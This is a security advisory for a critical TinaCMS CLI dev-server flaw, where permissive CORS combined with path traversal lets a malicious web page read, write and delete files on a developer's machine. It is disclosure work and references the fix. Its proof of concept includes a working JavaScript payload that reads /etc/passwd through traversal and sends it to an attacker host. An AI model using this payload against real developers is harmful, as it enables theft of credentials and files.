# [C] TinaCMS CLI Dev Server Vulnerable to Cross-Origin File Exfiltration via CORS Misconfiguration + Path Traversal in TinaCMS

## Summary
Severity: Critical
Advisory: GHSA-8pw3-9m7f-q734
CVE: CVE-2026-28792
CWE: CWE-22, CWE-942
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-12
Source: https://github.com/advisories/GHSA-8pw3-9m7f-q734
Type: github-advisory

## Affected
- npm: `@tinacms/cli` — affected >=0 <2.1.8

## Details
## Summary
The TinaCMS CLI dev server combines a permissive CORS configuration (Access-Control-Allow-Origin: *) with the path traversal vulnerability (previously reported) to enable a browser-based drive-by attack. A remote attacker can enumerate the filesystem, write arbitrary files, and delete arbitrary files on developer's machines by simply tricking them into visiting a malicious website while tinacms dev is running.

## Details
The TinaCMS dev server sets permissive CORS headers that allow **any origin** to make cross-origin requests:

- packages/@tinacms/cli/src/server/server.ts:
```
  app.use(cors());
```

- packages/@tinacms/cli/src/next/vite/plugins.ts:
```
     server.middlewares.use(cors());
```
When combined with the path traversal vulnerability, this creates a complete attack chain.
## Attack Scenario

### Prerequisites
1. Developer runs `tinacms dev` (default port 4001) 
2. Developer visits attacker's website while TinaCMS is running

**No other conditions required** - the dev server doesn't need to be:
- Exposed to the internet
- Bound to 0.0.0.0
- Accessible outside localhost

### Attack Flow
1. Developer starts TinaCMS: `tinacms dev`
2. Developer browses the web (checking email, social media, etc.)
3. Developer unknowingly visits attacker-controlled page (malicious ad, compromised site, etc.)
4. Attacker's JavaScript exploits CORS + path traversal to read sensitive files
5. Files are exfiltrated to attacker's server

## PoC
### Attacker's Malicious Website (evil.html):
```
<script>
fetch('http://localhost:4001/../../../etc/passwd')
  .then(r => r.text())
  .then(data => {
    // Exfil via GET
    const img = new Image();
    img.src = 'http://192.168.11.117:8080/exfil?data=' + encodeURIComponent(data);
  });
</script>
```
### Demonstration

**Step 1:** Start TinaCMS dev server
```bash
tinacms dev
# Server running on http://localhost:4001
```

**Step 2:** Host evil.html on attacker server
```bash
python3 -m http.server 8000
```

**Step 3:** Developer visits `http://attacker-server:8000/evil.html`

**Result:** The browser makes cross-origin requests to localhost:4001.
Because cors() returns Access-Control-Allow-Origin: *, the browser
allows the JavaScript to read the responses. Directory listings from
outside the media directory are sent to the attacker's server.
<img width="1900" height="366" alt="image" src="https://github.com/user-attachments/assets/72fdd31d-dd93-4728-9a4b-4d7d66d33617" />


## Impact
### Who is affected
Every developer running `tinacms dev` is vulnerable while the dev server is active. No special configuration is required the default setup is exploitable.

### What an attacker achieves
By hosting a malicious webpage (or injecting script via a compromised ad network, XSS on a forum, etc.), the attacker can silently:

1. **Enumerate the developer's filesystem** directory listings via `/media/list/` with path traversal reveal file and folder names
   across the entire filesystem
2. **Discover sensitive files** locate `.env`, `.git/config`,  SSH keys, cloud credentials, database configs
3. **Write arbitrary files** via `/media/upload/` with path traversal, the attacker can overwrite project source files, inject backdoors, or modify build scripts
4. **Delete arbitrary files** via `/media/` DELETE with path traversal

## References
- https://github.com/tinacms/tinacms/security/advisories/GHSA-8pw3-9m7f-q734
- https://nvd.nist.gov/vuln/detail/CVE-2026-28792
- https://github.com/tinacms/tinacms/pull/6450
- https://github.com/tinacms/tinacms/commit/56d533e610a520ba66b3e58f3a0dc03487d5d5d7
- https://github.com/tinacms/tinacms
- https://github.com/tinacms/tinacms/releases/tag/%40tinacms%2Fcli%402.1.8
